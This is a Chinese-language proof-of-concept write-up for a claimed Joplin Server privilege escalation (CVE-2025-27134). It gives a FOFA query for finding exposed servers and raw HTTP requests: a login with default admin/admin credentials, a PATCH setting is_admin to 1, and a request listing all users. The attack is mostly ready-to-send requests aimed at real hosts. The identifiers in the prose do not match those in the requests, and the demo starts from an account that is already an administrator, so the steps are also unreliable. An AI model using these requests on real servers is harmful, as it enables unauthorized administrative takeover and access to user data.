## JoplinServer 权限提升漏洞（CVE-2025-27134）

## 漏洞描述
JoplinServer 存在权限提升漏洞，普通用户可以通过 `PATCH /api/users/:id` 将 `is_admin` 字段设置为 1，从而获得管理员权限。

## 网络空间测绘
```
fofa: title="Joplin Server"
```

## POC
1、这里利用默认账号admin进行演示
```
POST /api/sessions HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: */*
Accept-Encoding: gzip
Content-Type: application/json
Content-Length: 58

{
  "email": "admin@localhost",
  "password": "admin"
}
```
注意登录后的id和user_idskr8iOIzNiCVvKqmH14E5X为第一个接口的user_id，V4mqWQZ3oUqZalRPT5EjGG为第一个接口的id
```
PATCH /api/users/skr8iOIZnIcVvKqmH14E5X HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip
Content-Type: application/json
Cookie: sessionId=V4mqWQZ3oUqZa1RPT5EjGG
Content-Length: 17

{
  "is_admin": 1
}
```
2、提权访问
```
GET /api/users HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip
Content-Type: application/json
Cookie: sessionId=V4mqWQZ3oUqZa1RPT5EjGG
```
## 参考
- 社区情报

